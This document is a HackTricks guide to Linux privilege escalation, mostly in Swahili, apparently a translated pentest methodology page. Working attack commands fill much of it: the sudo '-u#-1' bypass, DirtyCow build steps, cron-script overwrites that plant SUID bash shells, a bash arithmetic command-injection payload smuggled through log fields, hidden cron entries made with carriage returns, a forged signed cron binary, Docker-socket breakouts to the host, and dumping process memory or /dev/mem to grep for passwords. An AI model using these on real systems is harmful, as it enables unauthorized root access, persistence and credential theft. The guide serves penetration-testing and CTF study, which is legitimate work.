# Linux Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Taarifa za Mfumo

### Taarifa za OS

Hebu tuanze kupata taarifa kuhusu OS inayokimbia
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Path

Ikiwa una **idhini za kuandika kwenye kabrasha yoyote ndani ya `PATH`** unaweza hijack baadhi ya libraries au binaries:
```bash
echo $PATH
```
### Taarifa za Env

Je, kuna taarifa za kuvutia, passwords au API keys katika environment variables?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Angalia kernel version na uone ikiwa kuna exploit yoyote ambayo inaweza kutumika ku-escalate privileges
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya vulnerable kernel na baadhi ya **compiled exploits** tayari hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) and [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Tovuti nyingine ambapo unaweza kupata baadhi ya **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Ili kutoa matoleo yote ya vulnerable kernel kutoka wavuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Zana ambazo zinaweza kusaidia kutafuta kernel exploits ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (endesha IN victim, inachunguza tu exploits za kernel 2.x)

Kila wakati **tafuta toleo la kernel kwenye Google**, labda toleo lako la kernel limeandikwa katika exploit fulani ya kernel na kisha utakuwa na uhakika kuwa exploit hii ni halali.

Additional kernel exploitation technique:

{{#ref}}
../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Toleo la Sudo

Kulingana na toleo za sudo zilizo hatarini ambazo zinaonekana katika:
```bash
searchsploit sudo
```
Unaweza kukagua ikiwa toleo la sudo lina udhaifu kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Toleo za sudo kabla ya 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) zinaruhusu watumiaji wa ndani wasio na ruhusa kupandisha ruhusa zao hadi root kupitia chaguo la sudo `--chroot` wakati faili ya `/etc/nsswitch.conf` inatumiwa kutoka kwenye saraka inayodhibitiwa na mtumiaji.

Hapa kuna [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) ya kutumia udhaifu huo. Kabla ya kuendesha exploit, hakikisha toleo lako la `sudo` linaudhiifu na linaunga mkono kipengele cha `chroot`.

Kwa habari zaidi, rejea [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/) ya asili.

#### sudo < v1.8.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg: ukaguzi wa saini umefeli

Angalia **smasher2 box of HTB** kwa **mfano** wa jinsi vuln hii ingeweza kutumiwa
```bash
dmesg 2>/dev/null | grep "signature"
```
### Zaidi ya uorodhesaji wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Orodhesha ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Docker Breakout

Ikiwa uko ndani ya docker container unaweza kujaribu kutoroka kutoka ndani yake:


{{#ref}}
docker-security/
{{#endref}}

## Diski

Angalia **nini kime-mounted na nini kime-unmounted**, wapi na kwa nini. Ikiwa kitu chochote kime-unmounted unaweza kujaribu kuki-mount na kuangalia taarifa za kibinafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu muhimu

Orodhesha binaries muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia kama **any compiler is installed**. Hii ni muhimu ikiwa unahitaji kutumia kernel exploit, kwani inashauriwa ku-compile kwenye machine utakayotumia (au kwenye ile inayofanana).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zimewekwa

Angalia **toleo la vifurushi na huduma zilizowekwa**. Huenda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumika kwa ajili ya escalating privileges…\  
Inashauriwa kukagua kwa mkono toleo la programu zilizo na shaka zaidi zilizowekwa.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
If you have SSH access to the machine you could also use **openVAS** to check for outdated and vulnerable software installed inside the machine.

> [!NOTE] > _Kumbuka kwamba amri hizi zitaonyesha taarifa nyingi ambazo kwa ujumla hazitakuwa na msaada, kwa hiyo inapendekezwa kutumia programu kama OpenVAS au sawa ambazo zitakagua kama toleo lolote la programu lililosakinishwa lina udhaifu dhidi ya exploits zinazojulikana_

## Processes

Angalia **ni mchakato gani** yanaendeshwa na kagua kama mchakato wowote una **idhini zaidi kuliko unavyostahili** (labda tomcat inaendeshwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Daima angalia uwezekano wa [**electron/cef/chromium debuggers** zikiendesha, unaweza kuzitumia kupandisha hadhi za ruhusa](electron-cef-chromium-debugger-abuse.md). **Linpeas** hutambua hayo kwa kuangalia parameter `--inspect` ndani ya mstari wa amri wa mchakato.\
Pia **kagua ruhusa zako juu ya binaries za mchakato**, labda unaweza kuandika juu yao.

### Ufuatiliaji wa mchakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa muhimu sana kwa kubaini michakato dhaifu inayotekelezwa mara kwa mara au wakati mfululizo wa mahitaji unatimizwa.

### Kumbukumbu za mchakato

Some services of a server save **credentials in clear text inside the memory**.\
Kawaida utahitaji **root privileges** kusoma kumbukumbu za michakato zinazomilikiwa na watumiaji wengine, kwa hivyo hii kawaida ni ya faida zaidi unapokuwa tayari root na unataka kugundua credentials zaidi.\
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu za michakato unayomiliki**.

> [!WARNING]
> Note that nowadays most machines **don't allow ptrace by default** which means that you cannot dump other processes that belong to your unprivileged user.
>
> The file _**/proc/sys/kernel/yama/ptrace_scope**_ controls the accessibility of ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: all processes can be debugged, as long as they have the same uid. This is the classical way of how ptracing worked.
> - **kernel.yama.ptrace_scope = 1**: only a parent process can be debugged.
> - **kernel.yama.ptrace_scope = 2**: Only admin can use ptrace, as it required CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: No processes may be traced with ptrace. Once set, a reboot is needed to enable ptracing again.

#### GDB

If you have access to the memory of an FTP service (for example) you could get the Heap and search inside of its credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Kwa kitambulisho cha mchakato kilichotolewa, **maps zinaonyesha jinsi kumbukumbu inavyopangwa ndani ya anuwai ya anwani pepe ya mchakato huo**; pia zinaonyesha **idhinishaji za kila eneo lililotengenezwa**. Faili bandia **mem** **inafichua kumbukumbu ya mchakato yenyewe**. Kutoka kwenye faili ya **maps** tunajua ni **mikoa ya kumbukumbu inayosomeka** na offsets zao. Tunatumia habari hii **seek ndani ya faili ya mem na dump maeneo yote yanayosomeka** hadi kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikaji kwa kumbukumbu ya **kimwili** ya mfumo, sio kumbukumbu ya virtual. Eneo la anwani za virtual la kernel linaweza kufikiwa kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inaweza kusomwa tu na **root** na kundi la **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni utekelezaji wa Linux wa zana ya klasiki ProcDump kutoka katika suite ya zana za Sysinternals kwa Windows. Pata kwenye [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Zana

Ili ku-dump kumbukumbu ya mchakato unaweza kutumia:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa kwa mkono mahitaji ya root na ku-dump mchakato unaomilikiwa na wewe
- Script A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Kredenshali kutoka kwenye kumbukumbu za mchakato

#### Mfano wa Mkono

Ikiwa utagundua kwamba mchakato wa authenticator unakimbia:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza dump the process (angalia sehemu zilizotangulia ili kupata njia tofauti za dump the memory ya process) na kutafuta credentials ndani ya memory:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitapora **clear text credentials kutoka memory** na kutoka baadhi ya **well known files**. Kinahitaji root privileges ili kifanye kazi vizuri.

| Kipengele                                          | Jina la mchakato     |
| ------------------------------------------------- | -------------------- |
| GDM password (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Active FTP Connections)                   | vsftpd               |
| Apache2 (Active HTTP Basic Auth Sessions)         | apache2              |
| OpenSSH (Active SSH Sessions - Sudo Usage)        | sshd:                |

#### Regexes za Utafutaji/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Majukumu yaliyopangwa/Cron jobs

### Crontab UI (alseambusher) ikikimbia kama root – web-based scheduler privesc

Ikiwa paneli ya wavuti “Crontab UI” (alseambusher/crontab-ui) inakimbia kama root na imefungwa tu kwa loopback, bado unaweza kuifikia kupitia SSH local port-forwarding na kuunda privileged job ili escalate.

Mnyororo wa kawaida
- Gundua bandari iliyowekewa loopback tu (mfano, 127.0.0.1:8000) na realm ya Basic-Auth kupitia `ss -ntlp` / `curl -v localhost:8000`
- Tafuta credentials katika operational artifacts:
- Backups/scripts zenye `zip -P <password>`
- systemd unit inayofichua `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Tengeneza tunnel na ingia:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Unda high-priv job na iendeshe mara moja (inaangusha SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Tumia:
```bash
/tmp/rootshell -p   # root shell
```
Kuimarisha usalama
- Usifanye Crontab UI kuendeshwa kama root; tumia mtumiaji maalum kwa ruhusa chache
- Bind kwenye localhost na pia punguza upatikanaji kupitia firewall/VPN; usitumie tena passwords
- Epuka kuweka secrets ndani ya unit files; tumia secret stores au root-only EnvironmentFile
- Washa audit/logging kwa on-demand job executions

Angalia kama scheduled job yoyote ina udhaifu. Labda unaweza kuchukua faida ya script inayoendeshwa na root (wildcard vuln? can modify files that root uses? use symlinks? create specific files in the directory that root uses?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Njia ya Cron

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Kumbuka jinsi user "user" ana ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii user root anajaribu kutekeleza amri au script bila kuweka PATH. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron ikitumia script yenye wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root na ina “**\***” ndani ya amri, unaweza kuitumia (exploit) kufanya mambo yasiyotegemewa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa wildcard imewekwa kabla ya njia kama** _**/some/path/\***_ **, haiko hatarini (hata** _**./\***_ **sio).**

Soma ukurasa ufuatao kwa mwongozo zaidi kuhusu wildcard exploitation tricks:


{{#ref}}
wildcards-spare-tricks.md
{{#endref}}


### Bash arithmetic expansion injection in cron log parsers

Bash hufanya parameter expansion na command substitution kabla ya arithmetic evaluation katika ((...)), $((...)) na let. Ikiwa root cron/parser inasoma log fields zisizoaminika na kuzileta kwenye arithmetic context, mshambuliaji anaweza kuingiza command substitution $(...) ambayo itaendeshwa kama root wakati cron inapoendeshwa.

- Kwa nini inafanya kazi: Katika Bash, expansions hutokea kwa mpangilio huu: parameter/variable expansion, command substitution, arithmetic expansion, kisha word splitting na pathname expansion. Hivyo thamani kama `$(/bin/bash -c 'id > /tmp/pwn')0` kwanza hubadilishwa (amri inaendeshwa), kisha nambari iliyobaki `0` inatumiwa kwa arithmetic ili script iendelee bila makosa.

- Mfano wa kawaida wenye udhaifu:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Fanya text inayodhibitiwa na mshambuliaji iandikwe kwenye parsed log ili field inayofanana na nambari ijumuishe command substitution na imalize kwa digit. Hakikisha amri yako haichapishi kwenye stdout (au uitumie redirect) ili arithmetic ibaki halali.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Cron script overwriting and symlink

Ikiwa **unaweza kubadilisha cron script** inayotekelezwa na root, unaweza kupata shell kwa urahisi sana:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Iwapo script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, inaweza kuwa muhimu kufuta folder hiyo na **kuunda folder ya symlink kuelekezwa kwa nyingine** ikitumikia script unayodhibiti.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Imesainiwa maalum cron binaries with writable payloads
Blue teams mara nyingine hufanya "sign" cron-driven binaries kwa ku-dump sehemu maalum ya ELF na kutumia grep kutafuta vendor string kabla ya kuzi-execute kama root. Iwapo binary hiyo ina group-writable (mfano, `/opt/AV/periodic-checks/monitor` inayomilikiwa na `root:devs 770`) na unaweza leak the signing material, unaweza forge sehemu hiyo na hijack cron task:

1. Tumia `pspy` ili kukamata verification flow. Katika Era, root alikimbiza `objcopy --dump-section .text_sig=text_sig_section.bin monitor` ikifuatiwa na `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin` na kisha akatekeleza faili hiyo.
2. Recreate the expected certificate using the leaked key/config (from `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Build a malicious replacement (e.g., drop a SUID bash, add your SSH key) and embed the certificate into `.text_sig` so the grep passes:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Overwrite the scheduled binary while preserving execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Subiri kwa cron run inayofuata; mara tu naive signature check itakapofaulu, payload yako itaendesha kama root.

### Cron jobs zinazojirudia mara nyingi

Unaweza monitor processes kutafuta zile zinazoendeshwa kila 1, 2 au 5 dakika. Pengine unaweza kutumia nafasi hiyo na escalate privileges.

Kwa mfano, ili **ku-monitor kila 0.1s kwa dakika 1**, **kupanga kwa amri zilizotekelezwa kidogo** na kufuta amri ambazo zimeendeshwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itafuatilia na kuorodhesha kila process inayoanza).

### Isiyoonekana cron jobs

Inawezekana kuunda cronjob **kuweka carriage return baada ya comment** (bila newline character), na cron job itafanya kazi. Mfano (kumbuka carriage return char):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ zinazoweza kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`; ikiwa unaweza, unaweza **kuibadilisha** ili **itekeleze** backdoor yako wakati huduma inapo **anzishwa**, **ianzishwe upya** au **imishewe** (labda utahitaji kusubiri hadi mashine ianze upya). \\
Kwa mfano tengeneza backdoor yako ndani ya faili ya .service kwa **`ExecStart=/tmp/script.sh`**

### Service binaries zinazoweza kuandikwa

Kumbuka kwamba ikiwa una **idhini ya kuandika** kwenye binaries zinazotekelezwa na services, unaweza kuzibadilisha kuwa backdoors, hivyo wakati services zitapotelezwa tena backdoors zitatekelezwa.

### systemd PATH - Relative Paths

Unaweza kuona PATH inayotumiwa na **systemd** kwa:
```bash
systemctl show-environment
```
Ikiwa utagundua kwamba unaweza **write** katika yoyote ya folda za njia hiyo, huenda ukaweza **escalate privileges**. Unahitaji kutafuta **relative paths being used on service configurations** files kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **executable** yenye **jina sawa na binary ya relative path** ndani ya folda ya systemd PATH ambayo unaweza kuandika, na wakati service itapoombwa kutekeleza kitendo dhaifu (**Start**, **Stop**, **Reload**), **backdoor** yako itatekelezwa (watumiaji wasiokuwa na ruhusa kawaida hawawezi kuanza/kusimamisha services, lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu services kwa kutumia `man systemd.service`.**

## **Timers**

**Timers** ni unit files za systemd ambazo majina yao yanamalizika kwa `**.timer**` ambazo zinadhibiti `**.service**` files au matukio. **Timers** zinaweza kutumika kama mbadala wa cron kwa kuwa zina msaada uliojengwa kwa ajili ya matukio ya kalenda na matukio ya monotonic na zinaweza kuendeshwa asynchronously.

Unaweza kuorodhesha timers zote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kubadilisha timer, unaweza kuifanya iendeshe baadhi ya units zilizopo za systemd.unit (kama `.service` au `.target`)
```bash
Unit=backdoor.service
```
Katika nyaraka unaweza kusoma ni nini Unit:

> Unit itakayowashwa wakati timer hii itakapomalizika. Hoja ni jina la unit, ambalo suffix yake si ".timer". Ikiwa haitajwi, thamani hii kwa kawaida ni service yenye jina sawa na timer unit, isipokuwa kwa suffix. (Tazama hapo juu.) Inashauriwa kwamba jina la unit linalowashwa na jina la unit la timer vilingane kabisa, isipokuwa kwa suffix.

Kwa hivyo, ili kutumia vibaya ruhusa hii utahitaji:

- Tafuta systemd unit fulani (kama `.service`) ambayo inatekeleza **binary inayoweza kuandikwa**
- Tafuta systemd unit fulani ambayo inatekeleza **relative path** na una **writable privileges** juu ya **systemd PATH** (ili kuiga executable hiyo)

**Jifunze zaidi kuhusu timers kwa kutumia `man systemd.timer`.**

### **Kuwezesha Timer**

Ili kuwezesha timer unahitaji ruhusa za root na kuendesha:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Kumbuka **timer** inawezeshwa kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) zinawezesha **mawasiliano ya michakato** kwenye mashine moja au tofauti ndani ya modeli za client-server. Zinatumia faili za kihifadhi za Unix kwa mawasiliano kati ya tarakilishi na zinaanzishwa kupitia `.socket` files.

Sockets zinaweza kusanidiwa kwa kutumia `.socket` files.

**Jifunze zaidi kuhusu sockets kwa kutumia `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

- `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguzi hizi ni tofauti lakini muhtasari unatumika kuonyesha mahali itakaposikiliza socket (njia ya faili ya AF_UNIX socket, IPv4/6 na/au nambari ya port kusikiliza, n.k.)
- `Accept`: Inachukua hoja ya boolean. Ikiwa **true**, mfano wa **service** unazalishwa kwa kila muunganisho unaokuja na socket ya muunganisho pekee ndiyo itapitishwa kwake. Ikiwa **false**, sockets zote zinazolisikiliza zinapitishwa kwa **service unit** iliyozinduliwa, na service unit moja tu inazaliwa kwa muunganisho yote. Thamani hii hupuuzwa kwa datagram sockets na FIFOs ambapo service unit moja bila masharti inashughulikia trafiki yote inayoingia. **Defaults to false**. Kwa sababu za utendakazi, inashauriwa kuandika daemons mpya kwa njia inayofaa kwa `Accept=no`.
- `ExecStartPre`, `ExecStartPost`: Zinapokea mstari mmoja au zaidi wa amri, ambazo zinafanywa **kabla** au **baada** sockets/FIFOs zinazolisikiliza zinapoundwa na ku-bind, mtawaliwa. Alama ya kwanza ya mstari wa amri lazima iwe jina la faili kamili (absolute filename), ikifuatiwa na hoja za mchakato.
- `ExecStopPre`, `ExecStopPost`: Amri za ziada ambazo zinafanywa **kabla** au **baada** sockets/FIFOs zinazolisikiliza zifikwe na ziondolewe, mtawaliwa.
- `Service`: Inabainisha jina la **service** unit **ya kuanzisha** wakati wa **trafiki inayoingia**. Mipangilio hii inaruhusiwa tu kwa sockets zenye Accept=no. Kwa chaguo-msingi inatumia service yenye jina sawa na socket (ikiwa suffix imebadilishwa). Katika kesi nyingi, haipaswi kuwa lazima kutumia chaguo hili.

### Writable .socket files

Iwapo utapata faili ya `.socket` inayoweza kuandikwa (**writable**) unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na backdoor itatekelezwa kabla socket itaundwa. Kwa hivyo, **huenda utahitaji kusubiri hadi mashine ianze upya.**\
_Note that the system must be using that socket file configuration or the backdoor won't be executed_

### Writable sockets

Ikiwa **utatambua socket yoyote inayoweza kuandikwa** (_sasa tunazungumzia Unix Sockets sio faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na socket hiyo na maybe exploit a vulnerability.

### Enumerate Unix Sockets
```bash
netstat -a -p --unix
```
### Muunganisho wa moja kwa moja
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa exploitation:**


{{#ref}}
socket-command-injection.md
{{#endref}}

### HTTP sockets

Kumbuka kwamba kunaweza kuwa na baadhi ya **sockets zinazomsikiliza HTTP** maombi (_Sizungumzii kuhusu faili za .socket, bali kuhusu faili zinayotumika kama unix sockets_). Unaweza kuangalia hili kwa:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
Iwapo socket **itajibu ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **exploit udhaifu fulani**.

### Docker Socket Inayoweza Kuandikwa

Socket ya Docker, mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu inayostahili kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji `root` na wanachama wa kundi la `docker`. Kuwa na ruhusa ya kuandika kwenye socket hii kunaweza kupelekea privilege escalation. Hapa kuna muhtasari wa jinsi hili linafanyika na mbinu mbadala ikiwa Docker CLI haipatikani.

#### **Privilege Escalation na Docker CLI**

Ikiwa una ruhusa ya kuandika kwenye Docker socket, unaweza escalate privileges kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
Hizi amri zinakuwezesha kuendesha container yenye root-level access kwenye filesystem ya host.

#### **Kutumia Docker API Moja kwa Moja**

Katika matukio ambapo Docker CLI haipatikani, Docker socket bado inaweza kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **List Docker Images:** Pata orodha ya images zinazopatikana.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```

